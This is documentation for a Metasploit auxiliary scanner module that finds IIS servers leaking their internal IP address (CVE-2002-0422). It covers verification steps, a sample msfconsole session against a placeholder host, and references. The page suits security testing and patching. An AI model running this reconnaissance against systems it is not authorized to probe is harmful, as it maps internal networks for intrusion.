## Vulnerable Application

IIS, under various conditions, may respond to a request for `/`, `/images`, or `/default.htm` with `HTTP/1.0`
with a 300 HTTP response and a location header that contains an internal (192.x.x.x, 10.x.x.x, or 172.x.x.x)
IP address. It may also respond to a 'PROPFIND' request with a blank host header that contains the internal
IP address in then body

## Verification Steps

  1. Install a vulnerable version of IIS with at least one IP address on a private LAN
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/http/iis_internal_ip```
  4. Do: ```set RHOSTS [ip]```
  5. Do: ```run```
  6. You should find the internal IP

## Options

## Scenarios

### IIS with SSL

```
msf5 > use auxiliary/scanner/http/iis_internal_ip
msf5 auxiliary(scanner/http/iis_internal_ip) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf5 auxiliary(scanner/http/iis_internal_ip) > set rport 443
rport => 443
msf5 auxiliary(scanner/http/iis_internal_ip) > set rhosts 2.2.2.2
rhosts => 2.2.2.2
msf5 auxiliary(scanner/http/iis_internal_ip) > set verbose true
verbose => true
rmsf5 auxiliary(scanner/http/iis_internal_ip) > run

[*] 2.2.2.2:443     - Requesting GET / HTTP/1.0
[+] Location Header: https://10.1.1.20/home
[+] Result for 2.2.2.2 found Internal IP:  10.1.1.20
[*] 2.2.2.2:443     - Requesting GET /images HTTP/1.0
[*] 2.2.2.2:443     - Requesting GET /default.htm HTTP/1.0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
## References
- https://nvd.nist.gov/vuln/detail/CVE-2002-0422
- http://www.securityfocus.com/bid/1499
- https://www.exploit-db.com/exploits/20096
- https://support.microsoft.com/en-us/help/218180/internet-information-server-returns-ip-address-in-http-header-content
- https://support.microsoft.com/en-us/help/967342/fix-the-internal-ip-address-of-an-iis-7-0-server-is-revealed-if-an-htt
- https://techcommunity.microsoft.com/t5/iis-support-blog/iis-web-servers-running-in-windows-azure-may-reveal-their/ba-p/826500